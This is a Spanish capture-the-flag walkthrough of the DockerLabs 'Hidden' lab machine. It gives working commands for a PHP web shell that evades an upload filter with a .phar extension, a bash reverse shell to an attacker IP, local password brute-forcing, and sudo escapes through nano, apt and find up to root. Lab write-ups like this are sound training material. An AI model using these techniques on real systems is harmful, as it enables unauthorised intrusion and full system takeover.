# Máquina Hidden

---------------------

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

-----------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada al puerto 22 y 80:

```shell
nmap -sCV -p8080 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://hidden.lab/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: localhost
```

Entramos a la web para inspeccionar la página web. Como solo está abierto el puerto 80, sabemos que la intrusión va a ser vía web.

Al poner la IP en la url, vemos que no carga la página e intenta cargar "**hidden.lab**", por lo que lo añadiremos a nuestro **/etc/hosts**.

```shell
sudo nano /etc/hosts
```

Añadimos: "172.17.0.2 hidden.lab"

Ya podemos ver la web:

![Pasted image 20240416224904](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/ac385b73-00c6-4a1a-b382-b5f69c5182d4)

Aplicamos **fuzzing** por ejemplo con gobuster, para encontrar archivos y directorios. Encontramos directorios como **/mail** o **/js** pero tras inspeccionarlos no hay nada interesante.
Por lo que procedemos a enumerar posibles subdominios, tarea para la cual podemos utilizar también gobuster:

```shell
gobuster vhost -u http://hidden.lab/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 | grep -v "302"
----------------------------------------------------------------------------------------------
Found: dev.hidden.lab (Status: 200) [Size: 1653]    
```

Encontramos **dev.hidden.lab**, lo tendremos que añadir también al **/etc/hosts** y lo abriremos en el navegador.

![Pasted image 20240416225128](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/5a938e51-5cd2-4b55-b802-1926019929c7)

Nos encontramos ante un campo de subida de archivos. Es posible que tengamos que abusar de este para ganar acceso a la máquina.

Aplicamos **Fuzzing** sobre este nuevo subdominio con **gobuster**.

```shell
gobuster dir -u http://dev.hidden.lab/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x html,php,txt,php.bak
-----------------------------------------------------------------------------------------------
/uploads              (Status: 301) [Size: 318] [--> http://dev.hidden.lab/uploads/]
/index.html           (Status: 200) [Size: 1653]                                    
/upload.php           (Status: 200) [Size: 74]                                      
/server-status        (Status: 403) [Size: 279]    
```

Encontramos un directorio **/uploads** que será interesante de cara a subir un archivo malicioso donde lo podamos tener ubicado.

------------------
## Explotación

Trataremos de subir un archivo **cmd.php** con la sintaxis típica para conseguir un **RCE** (Remote Code Execution) en la web.

```php
<?php
	system($_GET['cmd']);
?>
```

Lo intentamos subir pero nos dice que no se permite subir archivos con extensión **.php**.

Si probamos con otras extensiones válidas también para php. Como pueden ser .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, etc.

He ido probando varias, y deja subirlas todas, pero no todas son interpretadas. Finalmente tras probar varias veces, conseguimos que nos interprete el archivo **cmd.phar**.

![Pasted image 20240416230402](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/1a2b542c-8d4b-4be2-a9e4-072e89773d4f)

Nos enviamos la reverse shell, poniéndonos en escucha con **netcat** en la máquina atacante:

```shell
sudo nc -nlvp 443
```

Nos la enviamos desde la url con:

```shell
http://dev.hidden.lab/uploads/cmd.phar?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.1.40/443 0>%261"
```

Estamos dentro !

------------
### Tratamiento de la tty

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------
## Escalada de privilegios

Revisamos capabilities, archivos SUID, etc. Y no hemos encontrado nada, por lo que vamos a transferirnos un script para hacer fuerza bruta hacia los usuarios del sistema desde la propia máquina. Nos transferiremos el script -> [Script de fuerza bruta](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh)
Y también el diccionario **rockyou**.

**Transferir los archivos a la máquina víctima**:
La máquina no cuenta con **wget** ni con **curl**. Una forma de transferirlos es en el campo de subida de archivos de la web que hemos vulnerado, en el dominio **dev.hidden.lab**.
Para el script no hay problema, lo subimos y ya lo tenemos en el directorio **uploads** dentro de la máquina.
Para el diccionario **rockyou**, como es enorme, me he transferido las 200 primeras líneas a un **.txt** y ha sido ese el que he subido.

Vemos que usuarios hay en el sistema:

```shell
cat /etc/passwd
```

Vemos 3 usuarios, **john**, **cafetero** y **bobby**
Nos situamos en el directorio **/uploads** donde tenemos el script de fuerza bruta y el diccionario y lo ejecutamos:

```shell
chmod +x Linux-Su-Force.sh
./Linux-Su-Force.sh cafetero rockyou2.txt 
------------------------------------------------
Contraseña encontrada para el usuario cafetero: 123123
```

Tras probar a hacer fuerza bruta contra el usuario **cafetero**, encontramos sus credenciales.
Tenemos la contraseña **123123** con la que podemos migrar al usuario **cafetero**

Hacemos **sudo -l** para ver si podemos ejecutar algo como root o como otro usuario del sistema.

```shell
sudo -l
---------------------
User cafetero may run the following commands on 8a54f4a7597f:
    (john) NOPASSWD: /usr/bin/nano
```

Podemos ejecutar **nano**. Esto es crítico y podemos abusar de este para ejecutar una consola como el usuario **john**. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)

```shell
sudo -u john /usr/bin/nano
^R^X (Ctrl+R y Ctrl+X)
reset; sh 1>&0 2>&0
```

![[Pasted image 20240415220430.png]]

Podemos hacer un **clear** para quitar el **nano** y ver bien la consola:

```shell
clear
whoami
----------------
john
```

Hemos migrado al usuario **john**. Hacemos **sudo -l** para ver si podemos ejecutar algo como root o como otro usuario del sistema.

```shell
sudo -l
---------------------
User john may run the following commands on 3e1d7f4234cf:
    (bobby) NOPASSWD: /usr/bin/apt
```

Podemos ejecutar **apt**. Esto es crítico y podemos abusar de este para ejecutar una consola como el usuario **john**. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)

```shell
sudo -u bobby /usr/bin/apt changelog apt
!/bin/bash
```

```shell
whoami
----------------------
bobby
```

Hemos conseguido migrar al usuario **bobby**. Hacemos **sudo -l** para ver si podemos ejecutar algo como root o como otro usuario del sistema.

```shell
sudo -l
---------------------
User bobby may run the following commands on 3e1d7f4234cf:
    (root) NOPASSWD: /usr/bin/find
```

Podemos ejecutar **find** como **root**. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)

```shell
sudo find . -exec /bin/sh \; -quit
whoami
----------------------------------------
root
```

Hemos alcanzado el nivel de privilegios máximo en el sistema !
